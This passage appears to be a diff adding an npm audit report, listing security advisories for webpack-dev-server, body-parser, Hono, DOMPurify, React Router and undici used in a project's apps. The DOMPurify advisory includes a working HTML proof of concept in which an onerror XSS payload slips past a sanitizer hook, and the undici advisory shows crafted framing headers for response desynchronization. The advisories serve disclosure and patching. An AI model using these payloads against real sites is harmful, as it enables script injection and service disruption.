+      "created": "2026-07-20T22:02:31.000Z",
+      "id": 1123966,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nAn unauthenticated peer that can reach the `webpack-dev-server` process can terminate it by sending either a normal HTTP request with a malformed `Host` header, or a WebSocket upgrade to the default `/ws` endpoint with a malformed `Origin` header. The malformed header triggers an uncaught exception in the host-validation path and crashes the dev server process.\n\n### Patches\n\nFixed in `webpack-dev-server` 5.2.6 by treating malformed `Host` and `Origin` header values as invalid rather than throwing (see [PR #5699](https://github.com/webpack/webpack-dev-server/pull/5699)).\n\n### Workarounds\n\nKeep the dev server bound to `localhost` (the default) and do not expose it to untrusted networks.",
+      "reported_by": null,
+      "title": "webpack-dev-server vulnerable to denial of service via a malformed Host or Origin header",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-14631"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "webpack-dev-server",
+      "vulnerable_versions": "<=5.2.5",
+      "github_advisory_id": "GHSA-m28w-2pqf-7qgj",
+      "recommendation": "Upgrade to version 5.2.6 or later",
+      "patched_versions": ">=5.2.6",
+      "updated": "2026-07-20T22:02:58.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-20",
+        "CWE-248"
+      ],
+      "url": "https://github.com/advisories/GHSA-m28w-2pqf-7qgj"
+    },
+    "1123976": {
+      "findings": [
+        {
+          "version": "2.2.2",
+          "paths": [
+            "apps__touch>body-parser"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/expressjs/body-parser/security/advisories/GHSA-v422-hmwv-36x6\n- https://nvd.nist.gov/vuln/detail/CVE-2026-12590\n- https://github.com/expressjs/body-parser/pull/698\n- https://github.com/expressjs/body-parser/pull/741\n- https://github.com/expressjs/body-parser/commit/2322e111cc321413ec2b7b76d01be533d3de9d7d\n- https://github.com/expressjs/body-parser/commit/3492672eee593d5c158f239b6e9115498a5dbeac\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/expressjs/body-parser/releases/tag/1.20.6\n- https://github.com/expressjs/body-parser/releases/tag/v2.3.0\n- https://github.com/advisories/GHSA-v422-hmwv-36x6",
+      "created": "2026-07-20T23:23:26.000Z",
+      "id": 1123976,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nWhen body-parser is configured with an invalid `limit` option value, such as an unparseable string or `NaN`, `bytes.parse()` returns `null` and the request body size check is silently skipped. Applications that rely on `limit` as their primary safeguard against oversized request bodies will accept arbitrarily large payloads, leading to excessive memory and CPU usage and denial of service.\n\nThis issue affects applications that pass a programmatically computed or user-configurable value to the `limit` option without validating it first.\n\n### Patches\n\nThis issue is fixed in [body-parser@2.3.0](https://github.com/expressjs/body-parser/releases/tag/v2.3.0) and [body-parser@1.20.6](https://github.com/expressjs/body-parser/releases/tag/v1.20.6) via [#698](https://github.com/expressjs/body-parser/pull/698). After the fix, invalid `limit` values throw a clear error at parser construction time instead of silently disabling enforcement. `null` and `undefined` continue to fall back to the default limit (`100kb`).\n\n### Workarounds\n\nValidate `limit` before passing it to body-parser. For example, parse the value with [`bytes.parse()`](https://github.com/visionmedia/bytes.js) at startup and reject any configuration where it returns `null` or a non-finite number.\n\n### References\n\n- [#698](https://github.com/expressjs/body-parser/pull/698): fix PR\n- [bytes.js](https://github.com/visionmedia/bytes.js): limit parser",
+      "reported_by": null,
+      "title": "body-parser vulnerable to denial of service when invalid limit value silently disables size enforcement",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-12590"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "body-parser",
+      "vulnerable_versions": ">=2.0.0 <2.3.0",
+      "github_advisory_id": "GHSA-v422-hmwv-36x6",
+      "recommendation": "Upgrade to version 2.3.0 or later",
+      "patched_versions": ">=2.3.0",
+      "updated": "2026-07-20T23:23:28.000Z",
+      "cvss": {
+        "score": 3.7,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-770"
+      ],
+      "url": "https://github.com/advisories/GHSA-v422-hmwv-36x6"
+    },
+    "1123977": {
+      "findings": [
+        {
+          "version": "1.20.5",
+          "paths": [
+            "apps__docs>@docusaurus/core>webpack-dev-server>express>body-parser"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/expressjs/body-parser/security/advisories/GHSA-v422-hmwv-36x6\n- https://nvd.nist.gov/vuln/detail/CVE-2026-12590\n- https://github.com/expressjs/body-parser/pull/698\n- https://github.com/expressjs/body-parser/pull/741\n- https://github.com/expressjs/body-parser/commit/2322e111cc321413ec2b7b76d01be533d3de9d7d\n- https://github.com/expressjs/body-parser/commit/3492672eee593d5c158f239b6e9115498a5dbeac\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/expressjs/body-parser/releases/tag/1.20.6\n- https://github.com/expressjs/body-parser/releases/tag/v2.3.0\n- https://github.com/advisories/GHSA-v422-hmwv-36x6",
+      "created": "2026-07-20T23:23:26.000Z",
+      "id": 1123977,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nWhen body-parser is configured with an invalid `limit` option value, such as an unparseable string or `NaN`, `bytes.parse()` returns `null` and the request body size check is silently skipped. Applications that rely on `limit` as their primary safeguard against oversized request bodies will accept arbitrarily large payloads, leading to excessive memory and CPU usage and denial of service.\n\nThis issue affects applications that pass a programmatically computed or user-configurable value to the `limit` option without validating it first.\n\n### Patches\n\nThis issue is fixed in [body-parser@2.3.0](https://github.com/expressjs/body-parser/releases/tag/v2.3.0) and [body-parser@1.20.6](https://github.com/expressjs/body-parser/releases/tag/v1.20.6) via [#698](https://github.com/expressjs/body-parser/pull/698). After the fix, invalid `limit` values throw a clear error at parser construction time instead of silently disabling enforcement. `null` and `undefined` continue to fall back to the default limit (`100kb`).\n\n### Workarounds\n\nValidate `limit` before passing it to body-parser. For example, parse the value with [`bytes.parse()`](https://github.com/visionmedia/bytes.js) at startup and reject any configuration where it returns `null` or a non-finite number.\n\n### References\n\n- [#698](https://github.com/expressjs/body-parser/pull/698): fix PR\n- [bytes.js](https://github.com/visionmedia/bytes.js): limit parser",
+      "reported_by": null,
+      "title": "body-parser vulnerable to denial of service when invalid limit value silently disables size enforcement",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-12590"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "body-parser",
+      "vulnerable_versions": "<1.20.6",
+      "github_advisory_id": "GHSA-v422-hmwv-36x6",
+      "recommendation": "Upgrade to version 1.20.6 or later",
+      "patched_versions": ">=1.20.6",
+      "updated": "2026-07-20T23:23:28.000Z",
+      "cvss": {
+        "score": 3.7,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-770"
+      ],
+      "url": "https://github.com/advisories/GHSA-v422-hmwv-36x6"
+    },
+    "1124006": {
+      "findings": [
+        {
+          "version": "1.19.14",
+          "paths": [
+            "apps__mcp-server>@modelcontextprotocol/sdk>@hono/node-server"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/honojs/node-server/security/advisories/GHSA-frvp-7c67-39w9\n- https://github.com/honojs/node-server/commit/cd076e117cfe4cb8d31f9eb11d2e8f38a6cb8faf\n- https://github.com/honojs/node-server/releases/tag/v2.0.5\n- https://github.com/advisories/GHSA-frvp-7c67-39w9",
+      "created": "2026-07-21T18:17:25.000Z",
+      "id": 1124006,
+      "npm_advisory_id": null,
+      "overview": "The same as the `hono` core [Path traversal in `serve-static` on Windows via encoded backslash (`%5C`)](https://github.com/honojs/hono/security/advisories/GHSA-wwfh-h76j-fc44).\n\n### Summary\n\nOn Windows hosts, an encoded backslash (`%5C`) in the request path decodes to `\\`, which the Windows path resolver treats as a separator. `serve-static` then resolves a single URL segment such as `admin\\secret.txt` into a nested file under the root and serves it, letting an attacker read static files meant to be protected behind prefix-mounted middleware. Directory escape (`..`) remains blocked.\n\n### Details\n\nThe router splits paths only on `/`, so `/admin%5Csecret.txt` is one segment and middleware on `/admin/*` does not run. The `serve-static` guard rejects `.`/`..` and consecutive separators but lets a lone `\\` through; on Windows the file resolver re-splits it into the protected subtree.\n\nThis affects Windows hosts serving static files via the Node, Bun, or Deno adapters that guard a static subtree with prefix-mounted middleware.\n\n### Impact\n\nAn unauthenticated attacker can read static files under a middleware-guarded prefix on Windows hosts. The read stays within the configured root; escape outside the root is not possible.",
+      "reported_by": null,
+      "title": "Node.js Adapter for Hono: Path traversal in `serve-static` on Windows via encoded backslash (`%5C`)",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "@hono/node-server",
+      "vulnerable_versions": "<2.0.5",
+      "github_advisory_id": "GHSA-frvp-7c67-39w9",
+      "recommendation": "Upgrade to version 2.0.5 or later",
+      "patched_versions": ">=2.0.5",
+      "updated": "2026-07-21T18:17:25.000Z",
+      "cvss": {
+        "score": 5.9,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-22"
+      ],
+      "url": "https://github.com/advisories/GHSA-frvp-7c67-39w9"
+    },
+    "1124022": {
+      "findings": [
+        {
+          "version": "3.4.11",
+          "paths": [
+            "apps__website>dompurify"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/cure53/DOMPurify/security/advisories/GHSA-c2j3-45gr-mqc4\n- https://github.com/cure53/DOMPurify/pull/1537\n- https://github.com/cure53/DOMPurify/commit/a9ca1e537422319a557a9a2aa61f003b23b4a197\n- https://github.com/cure53/DOMPurify/releases/tag/3.4.12\n- https://github.com/advisories/GHSA-c2j3-45gr-mqc4",
+      "created": "2026-07-21T19:41:07.000Z",
+      "id": 1124022,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nThere is a possible hook-policy inconsistency in DOMPurify 3.4.11 involving `CUSTOM_ELEMENT_HANDLING`.\n\nWhen a custom element is allowed via `CUSTOM_ELEMENT_HANDLING.tagNameCheck`, it appears that the element does not go through `afterSanitizeElements` in the same way as a normal element. As a result, an application that relies on `afterSanitizeElements` as a security policy layer to strip sensitive attributes from all elements may see those attributes removed from normal elements but preserved on allowed custom elements.\n\nThis does not appear to be a direct DOMPurify XSS or a case where DOMPurify directly allows executable payloads. The preserved value is still inert at sanitize time. The issue becomes relevant when the allowed custom element later re-injects that attribute value into an HTML sink such as `innerHTML`, creating a second-order XSS gadget.\n\n## Details\n\nThe issue appears to originate from the control flow in `src/purify.ts`: line 1672~1691\n\n```tsx\nconst _sanitizeDisallowedNode = function (\n    currentNode: any,\n    tagName: string\n  ): boolean {\n    /* Check if we have a custom element to handle */\n    if (!FORBID_TAGS[tagName] && _isBasicCustomElement(tagName)) {\n      if (\n        CUSTOM_ELEMENT_HANDLING.tagNameCheck instanceof RegExp &&\n        regExpTest(CUSTOM_ELEMENT_HANDLING.tagNameCheck, tagName)\n      ) {\n        return false;\n      }\n\n      if (\n        CUSTOM_ELEMENT_HANDLING.tagNameCheck instanceof Function &&\n        CUSTOM_ELEMENT_HANDLING.tagNameCheck(tagName)\n      ) {\n        return false;\n      }\n    }\n```\n\n`CUSTOM_ELEMENT_HANDLING` is parsed from user configuration at `src/purify.ts`: line 741~748\n\n```tsx\nconst customElementHandling =\n      objectHasOwnProperty(cfg, 'CUSTOM_ELEMENT_HANDLING') &&\n      cfg.CUSTOM_ELEMENT_HANDLING &&\n      typeof cfg.CUSTOM_ELEMENT_HANDLING === 'object'\n        ? clone(cfg.CUSTOM_ELEMENT_HANDLING)\n        : create(null);\n\n    CUSTOM_ELEMENT_HANDLING = create(null);\n```\n\nIn particular, `tagNameCheck`, `attributeNameCheck`, and `allowCustomizedBuiltInElements` are copied into the internal `CUSTOM_ELEMENT_HANDLING` object there.\n\nDuring element sanitization, `_sanitizeElements()` checks whether a node is forbidden or not allowlisted at `src/purify.ts`: line 1805~1814\n\n```tsx\n/* Remove element if anything forbids its presence */\n    if (\n      FORBID_TAGS[tagName] ||\n      (!(\n        EXTRA_ELEMENT_HANDLING.tagCheck instanceof Function &&\n        EXTRA_ELEMENT_HANDLING.tagCheck(tagName)\n      ) &&\n        !ALLOWED_TAGS[tagName])\n    ) {\n      return _sanitizeDisallowedNode(currentNode, tagName);\n    }\n```\n\nIf so, it immediately delegates to `_sanitizeDisallowedNode(currentNode, tagName)` and returns its boolean result.\n\nInside `_sanitizeDisallowedNode()`, the custom-element-specific allow path is implemented at `src/purify.ts`: line 1672~1692\n\n```tsx\nconst _sanitizeDisallowedNode = function (\n    currentNode: any,\n    tagName: string\n  ): boolean {\n    /* Check if we have a custom element to handle */\n    if (!FORBID_TAGS[tagName] && _isBasicCustomElement(tagName)) {\n      if (\n        CUSTOM_ELEMENT_HANDLING.tagNameCheck instanceof RegExp &&\n        regExpTest(CUSTOM_ELEMENT_HANDLING.tagNameCheck, tagName)\n      ) {\n        return false;\n      }\n\n      if (\n        CUSTOM_ELEMENT_HANDLING.tagNameCheck instanceof Function &&\n        CUSTOM_ELEMENT_HANDLING.tagNameCheck(tagName)\n      ) {\n        return false;\n      }\n    }\n```\n\nIf the node is treated as a basic custom element and `CUSTOM_ELEMENT_HANDLING.tagNameCheck` matches, the function returns `false` immediately at line 1682 or 1689, meaning ΓÇ£do not remove this nodeΓÇ¥.\n\nThat early `return false` is significant because control returns directly to `_sanitizeElements()` via the `return _sanitizeDisallowedNode(...)` at line 1813. As a result, the later logic in `_sanitizeElements()` is skipped for that custom element instance, including:\n\n- the namespace validation at `src/purify.ts`: line 1816~1826\n\n```tsx\n* Check whether element has a valid namespace.\n       Realm-safe check (GHSA-hpcv-96wg-7vj8): use the cached Node.prototype\n       nodeType getter rather than `instanceof Element`, which is realm-\n       bound and short-circuits to false for any node minted in a different\n       realm ΓÇö letting a foreign-realm element with a forbidden namespace\n       slip past the namespace check entirely. */\n    const nt = getNodeType ? getNodeType(currentNode) : currentNode.nodeType;\n    if (nt === NODE_TYPE.element && !_checkValidNamespace(currentNode)) {\n      _forceRemove(currentNode);\n      return true;\n    }\n```\n\n- the fallback-tag mXSS check at `src/purify.ts`: line 1828~1837\n\n```tsx\n/* Make sure that older browsers don't get fallback-tag mXSS */\n    if (\n      (tagName === 'noscript' ||\n        tagName === 'noembed' ||\n        tagName === 'noframes') &&\n      regExpTest(EXPRESSIONS.FALLBACK_TAG_CLOSE, currentNode.innerHTML)\n    ) {\n      _forceRemove(currentNode);\n      return true;\n    }\n```\n\n- most importantly for this report, the `afterSanitizeElements` hook dispatch at `src/purify.ts`: line 1850~1851.\n\n```tsx\n   /* Execute a hook if present */\n    _executeHooks(hooks.afterSanitizeElements, currentNode, null);\n```\n\nIn other words, a normal allowlisted element continues through `_sanitizeElements()` and reaches `hooks.afterSanitizeElements`, but a disallowed-by-default element that is revived by the `CUSTOM_ELEMENT_HANDLING.tagNameCheck` path does not. This creates a policy inconsistency: an application that relies on `afterSanitizeElements` to remove an attribute from all elements will observe that the policy is applied to normal elements but not to custom elements allowed through `CUSTOM_ELEMENT_HANDLING`.\n\nIn the PoC, the application hook removes `data-bio` from ordinary elements, but the same attribute remains on `<x-bio>` because the custom-element keep path bypasses `afterSanitizeElements`. The attribute itself is inert at sanitize time and DOMPurify is not directly allowing executable SVG/HTML through. The security impact appears when the application-defined custom element later reads the preserved `data-bio` value in `connectedCallback()` and writes it to `innerHTML`, turning the preserved attribute into a second-order XSS gadget.\n\n## PoC\n\nReproduced on DOMPurify 3.4.11.\n\n### Steps\n\n1. Save the following HTML to a file, for example `poc.html`.\n2. Open it in a browser.\n3. Observe that the `div` control loses `data-bio`, while the allowed custom element keeps it.\n4. Observe that after `connectedCallback()` runs, the candidate payload is reinserted into the DOM and executes through the custom elementΓÇÖs own sink.\n\n### HTML PoC\n\n```html\n<!DOCTYPE html>\n<html>\n<head>\n  <meta charset=\"UTF-8\">\n  <script src=\"https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.4.11/purify.min.js\"></script>\n</head>\n<body>\n<pre id=\"result\"></pre>\n\n<script>\nwindow.__controlFired = false;\nwindow.__candidateFired = false;\n\ncustomElements.define(\"x-bio\", class extends HTMLElement {\n  connectedCallback() {\n    const bio = this.getAttribute(\"data-bio\");\n    if (bio) this.innerHTML = bio;\n  }\n});\n\nDOMPurify.addHook(\"afterSanitizeElements\", node => {\n  if (node.hasAttribute && node.hasAttribute(\"data-bio\")) {\n    node.removeAttribute(\"data-bio\");\n  }\n});\n\nconst config = {\n  CUSTOM_ELEMENT_HANDLING: {\n    tagNameCheck: /^x-/\n  }\n};\n\nconst controlInput =\n  '<div data-bio=\"&lt;img src=x onerror=window.__controlFired=true&gt;\"></div>';\n\nconst candidateInput =\n  '<x-bio data-bio=\"&lt;img src=x onerror=window.__candidateFired=true&gt;\"></x-bio>';\n\nconst cleanControl = DOMPurify.sanitize(controlInput, config);\nconst cleanCandidate = DOMPurify.sanitize(candidateInput, config);\n\nconst container = document.createElement(\"div\");\ncontainer.innerHTML = cleanCandidate;\ndocument.body.appendChild(container);\n\nsetTimeout(() => {\n  document.getElementById(\"result\").textContent =\n    \"This is not direct DOMPurify XSS.\\n\" +\n    \"The payload becomes executable only after x-bio writes data-bio into innerHTML.\\n\\n\" +\n    \"control: \" + cleanControl + \"\\n\" +\n    \"candidate: \" + cleanCandidate + \"\\n\" +\n    \"after connectedCallback: \" + container.innerHTML + \"\\n\" +\n    \"control fired: \" + window.__controlFired + \"\\n\" +\n    \"candidate fired: \" + window.__candidateFired;\n}, 100);\n</script>\n</body>\n</html>\n```\n\n### Expected result\n\n```\ncontrol: <div></div>\ncandidate: <x-bio data-bio=\"<img src=x onerror=window.__candidateFired=true>\"></x-bio>\nafter connectedCallback: <x-bio data-bio=\"...\"><img src=\"x\" onerror=\"window.__candidateFired=true\"></x-bio>\ncontrol fired: false\ncandidate fired: true\n```\n\nThis is output of HTML PoC.\n\n<img width=\"1917\" height=\"961\" alt=\"poc\" src=\"https://github.com/user-attachments/assets/80e22989-5779-42f8-8ffb-106e9a4c2b10\" />\n\n\n## Impact\n\nThis does not appear to affect DOMPurifyΓÇÖs default configuration as a direct sanitizer bypass.\n\nThe impact is limited to applications that:\n\n- enable `CUSTOM_ELEMENT_HANDLING`,\n- rely on `afterSanitizeElements` as a security policy layer,\n- expect that hook to apply uniformly to all surviving elements,\n- and have allowed custom elements that later re-inject preserved attribute values into `innerHTML` or another HTML sink.\n\nIn that situation, the behavior can become a second-order XSS gadget because a security-relevant attribute is removed from normal elements but remains on allowed custom elements.\n\nPossible fixes or mitigations might include\n\n- ensuring that allowed custom elements also consistently pass through `afterSanitizeElements`\n- documenting clearly that elements preserved via `CUSTOM_ELEMENT_HANDLING` may not participate in the same post-element hook flow as normal allowlisted elements.",
+      "reported_by": null,
+      "title": "DOMPurify: `CUSTOM_ELEMENT_HANDLING` bypasses `afterSanitizeElements` for allowed custom elements.",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "low",
+      "module_name": "dompurify",
+      "vulnerable_versions": "<=3.4.11",
+      "github_advisory_id": "GHSA-c2j3-45gr-mqc4",
+      "recommendation": "Upgrade to version 3.4.12 or later",
+      "patched_versions": ">=3.4.12",
+      "updated": "2026-07-21T19:41:08.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-79",
+        "CWE-184",
+        "CWE-693"
+      ],
+      "url": "https://github.com/advisories/GHSA-c2j3-45gr-mqc4"
+    },
+    "1124268": {
+      "findings": [
+        {
+          "version": "6.30.3",
+          "paths": [
+            "apps__management>react-router-dom>react-router"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/remix-run/react-router/security/advisories/GHSA-wrjc-x8rr-h8h6\n- https://github.com/remix-run/react-router/pull/15176\n- https://github.com/remix-run/react-router/blob/main/CHANGELOG.md#v7180\n- https://github.com/remix-run/react-router/releases/tag/react-router@7.18.0\n- http://github.com/remix-run/react-router/pull/15176\n- https://github.com/advisories/GHSA-wrjc-x8rr-h8h6",
+      "created": "2026-07-23T19:38:28.000Z",
+      "id": 1124268,
+      "npm_advisory_id": null,
+      "overview": "This is a follow up to [CVE-2025-68470](https://github.com/remix-run/react-router/security/advisories/GHSA-9jcx-v3wj-wh4m).  React Router was alerted to certain scenarios in which the fix there was incomplete so there still existed some scenarios where attacker supplied paths passed to navigation mechanisms could result in unexpected external navigations.",
+      "reported_by": null,
+      "title": "React Router: Open redirect via backslash in <Link> and useNavigate (CVE-2025-68470 bypass)",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-53669"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "react-router",
+      "vulnerable_versions": ">=6.0.0 <7.18.0",
+      "github_advisory_id": "GHSA-wrjc-x8rr-h8h6",
+      "recommendation": "Upgrade to version 7.18.0 or later",
+      "patched_versions": ">=7.18.0",
+      "updated": "2026-07-23T19:38:29.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-601"
+      ],
+      "url": "https://github.com/advisories/GHSA-wrjc-x8rr-h8h6"
+    },
+    "1124270": {
+      "findings": [
+        {
+          "version": "6.30.3",
+          "paths": [
+            "apps__management>react-router-dom"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/remix-run/react-router/security/advisories/GHSA-jjmj-jmhj-qwj2\n- https://github.com/remix-run/react-router/pull/14718\n- https://github.com/remix-run/react-router/commit/3a5b5ad0e5cf9918c646509563f5c41a89226ff3\n- https://github.com/remix-run/react-router/blob/main/CHANGELOG.md#v7180\n- https://github.com/remix-run/react-router/releases/tag/react-router@7.18.0\n- https://github.com/advisories/GHSA-jjmj-jmhj-qwj2",
+      "created": "2026-07-23T19:36:31.000Z",
+      "id": 1124270,
+      "npm_advisory_id": null,
+      "overview": "Applications with open redirects could permit attacker crafted links to result in redirects to unexpected external location or XSS vectors.",
+      "reported_by": null,
+      "title": "React Router: Open redirect leading to XSS",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-53668"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "react-router-dom",
+      "vulnerable_versions": ">=6.30.2 <=6.30.4",
+      "github_advisory_id": "GHSA-jjmj-jmhj-qwj2",
+      "recommendation": "None",
+      "patched_versions": "<0.0.0",
+      "updated": "2026-07-23T19:36:32.000Z",
+      "cvss": {
+        "score": 6.9,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-601"
+      ],
+      "url": "https://github.com/advisories/GHSA-jjmj-jmhj-qwj2"
+    },
+    "1124272": {
+      "findings": [
+        {
+          "version": "6.30.3",
+          "paths": [
+            "apps__management>react-router-dom>react-router"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/remix-run/react-router/security/advisories/GHSA-337j-9hxr-rhxg\n- https://github.com/remix-run/react-router/pull/15175\n- https://github.com/remix-run/react-router/commit/9d22943fd46c8ae4b08236425fa3549e10e9ad1a\n- https://github.com/remix-run/react-router/blob/main/CHANGELOG.md#v7180\n- https://github.com/remix-run/react-router/releases/tag/react-router@7.18.0\n- https://github.com/advisories/GHSA-337j-9hxr-rhxg",
+      "created": "2026-07-23T19:34:14.000Z",
+      "id": 1124272,
+      "npm_advisory_id": null,
+      "overview": "If application code allows attacker supplied input to overwrite certain aspects of errors caught by the SSR process, then it was possible for attacker to trigger unexpected constructor execution on the client which would trigger outbound network traffic.  This is only possible with very specific (and unlikely) application layer code.\n\n> [!NOTE]\n> This does not impact your application if you are using Declarative Mode.  This only impacts Framework Mode and Data Mode applications doing manual SSR/hydration",
+      "reported_by": null,
+      "title": "React Router: Arbitrary Constructor Injection via deserializeErrors() in React Router SSR Hydration",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-53666"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "react-router",
+      "vulnerable_versions": ">=6.4.0 <7.18.0",
+      "github_advisory_id": "GHSA-337j-9hxr-rhxg",
+      "recommendation": "Upgrade to version 7.18.0 or later",
+      "patched_versions": ">=7.18.0",
+      "updated": "2026-07-23T19:34:16.000Z",
+      "cvss": {
+        "score": 6.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-470"
+      ],
+      "url": "https://github.com/advisories/GHSA-337j-9hxr-rhxg"
+    },
+    "1130716": {
+      "findings": [
+        {
+          "version": "6.27.0",
+          "paths": [
+            "apps__installer>electron-builder>app-builder-lib>@electron/rebuild>node-gyp>undici"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodejs/undici/security/advisories/GHSA-8xcm-r25x-g524\n- https://nvd.nist.gov/vuln/detail/CVE-2026-16728\n- https://github.com/nodejs/undici/commit/1b5a5312c3a7d7a30c31bf0d000b39a8a2531e1c\n- https://github.com/nodejs/undici/commit/2b3f749336d356bbbc50192f87f6cf7bc714721a\n- https://github.com/nodejs/undici/commit/4a9dafb16ff43880cf590e6d9c2aeee25fbff6d7\n- https://github.com/nodejs/undici/commit/4fd5a0c61e627f928b7003adc4ffe1e55ec63420\n- https://github.com/nodejs/undici/commit/cba3a52ac2e7abcc4e656d82af8579ea82c2bb9e\n- https://github.com/nodejs/undici/commit/e11a68ed4ff345c79402476f7a00d473443e318d\n- https://hackerone.com/reports/3828685\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/nodejs/undici/releases/tag/v6.28.0\n- https://github.com/nodejs/undici/releases/tag/v7.29.0\n- https://github.com/nodejs/undici/releases/tag/v8.9.0\n- https://github.com/advisories/GHSA-8xcm-r25x-g524",
+      "created": "2026-08-03T19:24:33.000Z",
+      "id": 1130716,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nUndici's `interceptors.retry()` can deliver a response whose body length does not match the `Content-Length` header exposed to the application after a retry or resume of a partial response. Applications that use `interceptors.retry()` and forward upstream response headers and bodies downstream, for example proxy or gateway applications, may emit an invalid HTTP response with a stale `Content-Length` header. This can lead to downstream response desynchronization, connection hangs, or response corruption in clients or intermediaries that rely on the forwarded framing metadata.\n\nA malicious or faulty upstream can respond to a range request with a `206 Partial Content` response such as:\n\n```http\nContent-Range: bytes 0-99/300\nContent-Length: 300\n```\n\nand then send only 99 bytes before closing the socket. `interceptors.retry()` can then retry with `Range: bytes=99-99`, receive the final byte, and deliver a 100-byte body to the application while the response headers still contain `Content-Length: 300` from the first response.\n\nThe bug requires `interceptors.retry()` to be enabled, an upstream that returns a partial response with a mismatched framing header, and a downstream forwarder that does not remove or recalculate `Content-Length`.\n\n### Patches\n\nPatched in undici v6.28.0, v7.29.0, and v8.9.0. Users should upgrade to one of these versions or later.\n\n### Workarounds\n\n- Disable `interceptors.retry()` for untrusted upstreams.\n- Remove or recalculate `Content-Length` before forwarding a response body assembled or transformed by Undici.",
+      "reported_by": null,
+      "title": "undici vulnerable to downstream response desynchronization via retry interceptor",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-16728"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "undici",
+      "vulnerable_versions": "<6.28.0",
+      "github_advisory_id": "GHSA-8xcm-r25x-g524",
+      "recommendation": "Upgrade to version 6.28.0 or later",
+      "patched_versions": ">=6.28.0",
+      "updated": "2026-08-03T19:24:35.000Z",
+      "cvss": {
+        "score": 4.8,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-444"
+      ],
+      "url": "https://github.com/advisories/GHSA-8xcm-r25x-g524"
+    },
+    "1130727": {
+      "findings": [
+        {
+          "version": "6.27.0",
+          "paths": [
+            "apps__installer>electron-builder>app-builder-lib>@electron/rebuild>node-gyp>undici"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodejs/undici/security/advisories/GHSA-m8rv-5g2x-5cg5\n- https://nvd.nist.gov/vuln/detail/CVE-2026-15157\n- https://github.com/nodejs/undici/commit/33928bc24f742ea8422ed90d17f2e0cc83e4d09d\n- https://github.com/nodejs/undici/commit/740a0b7c173cb4a83a5b693e96e8f3a116cfc400\n- https://github.com/nodejs/undici/commit/7d3cf924c262c486bc77f951348f4e5c847b7b42\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/nodejs/undici/releases/tag/v6.28.0\n- https://github.com/nodejs/undici/releases/tag/v7.29.0\n- https://github.com/nodejs/undici/releases/tag/v8.9.0\n- https://github.com/advisories/GHSA-m8rv-5g2x-5cg5",
+      "created": "2026-08-03T19:33:53.000Z",
+      "id": 1130727,
+      "npm_advisory_id": null,
